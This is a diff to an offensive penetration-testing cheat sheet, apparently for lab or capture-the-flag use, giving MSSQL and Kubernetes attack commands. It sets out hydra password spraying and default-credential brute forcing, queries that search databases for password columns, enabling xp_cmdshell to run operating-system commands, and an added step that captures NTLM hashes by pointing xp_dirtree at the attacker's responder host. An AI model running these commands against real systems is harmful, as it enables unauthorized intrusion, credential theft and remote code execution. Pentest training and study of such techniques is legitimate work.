@@ -786,18 +786,21 @@ kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat tok
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod
 
 [*] (1433) MSSQL
-+---------- Spray Service ----------+
++---------- Spray ----------+
 (hydra -I mssql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Bruteforce Using Defaults ----------+
++---------- Bruteforce ----------+
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
 hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null
 
-+---------- Executing Queries ----------+
++---------- Get DB ----------+
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "SELECT name FROM master.dbo.sysdatabases;" | grep -oP '^name:\s*\K\S+'
 
-DB_NAME="staging"
++---------- Set DB ----------+
+DB_NAME="master"
+
++---------- Query DB ----------+
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'user'
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;" | grep -i -B2 'passw'
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'account'
@@ -807,6 +810,10 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT @@VERSION AS version, HOST_NAME() AS hostname, SYSTEM_USER AS sys_user;"
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_cmdshell 'dir C:\ && whoami /user /priv';"
+
++---------- Get Hash ----------+
+sudo responder -I tun0 -v
+DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"
 
 +---------- Impacket ----------+
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
